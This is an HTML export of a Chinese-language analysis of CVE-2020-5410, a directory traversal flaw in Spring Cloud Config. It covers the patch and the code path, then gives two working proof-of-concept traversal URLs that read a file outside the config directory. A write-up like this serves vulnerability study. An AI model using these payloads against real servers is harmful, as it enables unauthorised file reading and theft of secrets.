<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2020-5410spring-cloud-config-目录穿越漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2020-5410</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Spring Cloud Config </span><span class="csECDA2D3">目录穿越漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Spring Cloud Config</span><span class="cs9C1B1871">，</span><span class="cs8926E06">2.2.3</span><span class="cs9C1B1871">之前的</span><span class="cs8926E06">2.2.x</span><span class="cs9C1B1871">版本，</span><span class="cs8926E06">2.1.9</span><span class="cs9C1B1871">之前的</span><span class="cs8926E06">2.1.x</span><span class="cs9C1B1871">版本以及较旧的不受支持的版本允许应用程序通过</span><span class="cs8926E06">spring-cloud-config-server</span><span class="cs9C1B1871">模块提供任意配置文件。恶意用户或攻击者可以使用特制</span><span class="cs8926E06">URL</span><span class="cs9C1B1871">发送请求，这可能导致目录遍历攻击。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Spring Cloud Config</span><span class="cs9C1B1871">，</span><span class="cs8926E06">2.2.3</span><span class="cs9C1B1871">之前的</span><span class="cs8926E06">2.2.x</span><span class="cs9C1B1871">版本，</span><span class="cs8926E06">2.1.9</span><span class="cs9C1B1871">之前的</span><span class="cs8926E06">2.1.x</span><span class="cs9C1B1871">版本</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">这次补丁主要是两个部分</span><span class="cs8926E06">,</span><span class="cs9C1B1871">第一个部分是将对路径的检测方法单独的封装了出来</span><span class="cs8926E06">,</span><span class="cs9C1B1871">封装到了</span><span class="cs8926E06">PathUtils</span><span class="cs9C1B1871">类中</span><span class="cs8926E06">,</span><span class="cs9C1B1871">并且做了部分的修改</span><span class="cs8926E06">,</span><span class="cs9C1B1871">其中最主要的是检测了</span><span class="cs9FB05234">#</span><span class="cs8926E06">,</span><span class="cs9C1B1871">至于是为什么</span><span class="cs8926E06">,</span><span class="cs9C1B1871">后面来说。</span><span class="cs8926E06"><br/><img src="Web安全/Spring_Cloud/%ef%bc%88CVE-2020-5410%ef%bc%89Spring%20Cloud%20Config%20%e7%9b%ae%e5%bd%95%e7%a9%bf%e8%b6%8a%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="205" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第二部分</span><span class="cs8926E06">,</span><span class="cs9C1B1871">也就是漏洞的触发入口，在</span><span class="cs8926E06">environment/EnvironmentController.java</span><span class="cs9C1B1871">中</span><span class="cs8926E06">,</span><span class="cs9C1B1871">增加了对</span><span class="cs8926E06">name</span><span class="cs9C1B1871">、</span><span class="cs8926E06">label</span><span class="cs9C1B1871">字段的检测</span><span class="cs8926E06"><br/><img src="Web安全/Spring_Cloud/%ef%bc%88CVE-2020-5410%ef%bc%89Spring%20Cloud%20Config%20%e7%9b%ae%e5%bd%95%e7%a9%bf%e8%b6%8a%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="176" alt="" style="border-width:0px;" /><br/></span><span class="cs9C1B1871">通过补丁我们可以大概知道漏洞应该是出在</span><span class="cs8926E06">EnvironmentController,</span><span class="cs9C1B1871">但是具体怎么触发并不知道</span><span class="cs8926E06">,</span><span class="cs9C1B1871">所以我们需要跟一遍正常逻辑看一下处理流程。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">既然是目录穿越漏洞</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我们先通过环境变量设置本地读取</span></p><p class="cs3A447A38"><span class="cs9FB05234">profiles:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;active: native</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;cloud:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;config:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;native:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;search-locations:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- file:/test/config-repo-master</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后使用正确的请求来动态跟踪调用堆栈</span><span class="cs9FB05234">https://wiki.0-sec.org/img src=&quot;https://wiki.0-sec.org/img/c21512ee8d924eb3b56736fa1060c004.png&quot; alt=&quot;3.png&quot; class=&quot;large&quot; onclick=&quot;window.open(this.src)&quot; /&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在跟到</span><span class="cs9FB05234">environment/NativeEnvironmentRepository.java</span><span class="cs9C1B1871">的时候发现参数进行了拼接</span><span class="cs8926E06">,<br/><img src="Web安全/Spring_Cloud/%ef%bc%88CVE-2020-5410%ef%bc%89Spring%20Cloud%20Config%20%e7%9b%ae%e5%bd%95%e7%a9%bf%e8%b6%8a%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="355" alt="" style="border-width:0px;" /><br/></span><span class="cs9C1B1871">重新跟进</span><span class="cs8926E06">getArgs</span><span class="cs9C1B1871">看一下</span></p><p class="cs3A447A38"><span class="cs9FB05234">private String[] getArgs(String application, String profile, String label) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;List&lt;String&gt; list = new ArrayList&lt;String&gt;();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String config = application;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!config.startsWith(&quot;application&quot;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;config = &quot;application,&quot; + config;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;list.add(&quot;--spring.config.name=&quot; + config);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;list.add(&quot;--spring.cloud.bootstrap.enabled=false&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;list.add(&quot;--encrypt.failOnError=&quot; + this.failOnError);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;list.add(&quot;--spring.config.location=&quot; + StringUtils.arrayToCommaDelimitedString(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;getLocations(application, profile, label).getLocations()));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return list.toArray(new String[0]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">主要在</span><span class="cs8926E06">getLocations</span><span class="cs9C1B1871">中对路径进行了下拼接</span><span class="cs8926E06">,</span><span class="cs9C1B1871">声称了一个将</span><span class="cs8926E06">env</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">uri</span><span class="cs9C1B1871">拼接了</span><span class="cs8926E06">label,</span><span class="cs9C1B1871">生成新的</span><span class="cs8926E06">location,</span><span class="cs9C1B1871">那么这个点就是我们目录穿越的关键</span><span class="cs8926E06">,</span><span class="cs9C1B1871">继续往下跟</span><span class="cs8926E06">,</span><span class="cs9C1B1871">在</span><span class="cs9FB05234">environment/NativeEnvironmentRepository.java</span><span class="cs9C1B1871">中会将</span><span class="cs8926E06">args</span><span class="cs9C1B1871">传入</span><span class="cs8926E06">spring boot</span><span class="cs9C1B1871">的</span><span class="cs9FB05234">ConfigurableApplicationContext context = builder.run(args)</span><span class="cs8926E06">,</span><span class="cs9C1B1871">后面会使用</span><span class="cs8926E06">loader.load</span><span class="cs9C1B1871">函数加载资源</span><span class="cs8926E06">,</span><span class="cs9C1B1871">在加载资源的时候会遍历</span><span class="cs8926E06">locations</span><span class="cs9C1B1871">拼接</span><span class="cs8926E06">name</span><span class="cs9C1B1871">来获取资源</span><span class="cs8926E06">,</span><span class="cs9C1B1871">首先来判断是否存在文件</span><span class="cs8926E06">,</span><span class="cs9C1B1871">如果文件存在</span><span class="cs8926E06">,</span><span class="cs9C1B1871">则去使用</span><span class="cs8926E06">url.openConnection</span><span class="cs9C1B1871">来获取资源</span><span class="cs8926E06">,</span><span class="cs9C1B1871">通过分析我们知道</span><span class="cs8926E06">label</span><span class="cs9C1B1871">和</span><span class="cs8926E06">name</span><span class="cs9C1B1871">是我们可控的传入</span><span class="cs8926E06">,</span></p><p class="cs3A447A38"><span class="cs9FB05234">url = env-uri+label+name+extension</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因为是借助的</span><span class="cs8926E06">url.openConnection,</span><span class="cs9C1B1871">结合补丁增加了</span><span class="cs9FB05234">#</span><span class="cs9C1B1871">限制</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我们可以清楚的知道通过在</span><span class="cs8926E06">name</span><span class="cs9C1B1871">中以</span><span class="cs9FB05234">#</span><span class="cs9C1B1871">结尾</span><span class="cs8926E06">,</span><span class="cs9C1B1871">使</span><span class="cs8926E06">extension</span><span class="cs9C1B1871">成为锚点</span><span class="cs8926E06">,</span><span class="cs9C1B1871">也就绕过了后缀的限制。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">在构造</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">之前其实还有一个问题，就是这里我们知道一开始是没有对路径进行检测的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">那么我们是否可以直接使用</span><span class="cs9FB05234">../../</span><span class="cs9C1B1871">来穿越呢</span><span class="cs8926E06">?</span><span class="cs9C1B1871">答案是否</span><span class="cs8926E06">,</span><span class="cs9C1B1871">因为如果我们想要传入后端处理</span><span class="cs8926E06">,</span><span class="cs9C1B1871">必须二次</span><span class="cs8926E06">url</span><span class="cs9C1B1871">编码</span><span class="cs8926E06">,</span><span class="cs9C1B1871">但是二次编码后</span><span class="cs8926E06">,</span><span class="cs9C1B1871">首先经过的是判断文件是否存在</span><span class="cs8926E06">,</span><span class="cs9C1B1871">如果存在才调用</span><span class="cs8926E06">url.openConnection</span><span class="cs9C1B1871">来处理</span><span class="cs8926E06">,</span><span class="cs9C1B1871">经过一次解码后</span><span class="cs8926E06">,</span><span class="cs9C1B1871">显然该路径文件是不存在的。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Cloud/%ef%bc%88CVE-2020-5410%ef%bc%89Spring%20Cloud%20Config%20%e7%9b%ae%e5%bd%95%e7%a9%bf%e8%b6%8a%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="77" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里就有了跟</span><span class="cs8926E06">CVE-2020-5405</span><span class="cs9C1B1871">一样的操作</span><span class="cs8926E06">,</span><span class="cs9C1B1871">将</span><span class="cs9FB05234">(_)</span><span class="cs9C1B1871">替换成了</span><span class="cs9FB05234">/</span><span class="cs8926E06">,</span><span class="cs9C1B1871">处理方法在</span></p><p class="cs3A447A38"><span class="cs9FB05234">public static String normalize(String s) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (s != null &amp;&amp; s.contains(SLASH_PLACEHOLDER)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// &quot;(_)&quot; is uncommon in a git repo name, but &quot;/&quot; cannot be matched</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// by Spring MVC</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return s.replace(SLASH_PLACEHOLDER, &quot;/&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return s;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org:8889/flag.txt%23/222/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29tmp%28_%29</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Cloud/%ef%bc%88CVE-2020-5410%ef%bc%89Spring%20Cloud%20Config%20%e7%9b%ae%e5%bd%95%e7%a9%bf%e8%b6%8a%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="163" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">构造完这个</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">会想到</span><span class="cs8926E06">,</span><span class="cs9C1B1871">既然是</span><span class="cs8926E06">label+name</span><span class="cs9C1B1871">来拼接的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我们是否可以不用管</span><span class="cs8926E06">label,</span><span class="cs9C1B1871">目录穿越的方法在</span><span class="cs8926E06">name</span><span class="cs9C1B1871">处构造呢</span><span class="cs8926E06">?<br/></span><span class="cs9C1B1871">答案是可以的</span><span class="cs8926E06">,poc</span><span class="cs9C1B1871">如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org:8889/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Fflag.txt%23/222/11</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Cloud/%ef%bc%88CVE-2020-5410%ef%bc%89Spring%20Cloud%20Config%20%e7%9b%ae%e5%bd%95%e7%a9%bf%e8%b6%8a%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="213" alt="" style="border-width:0px;" /></span></p></body>
</html>
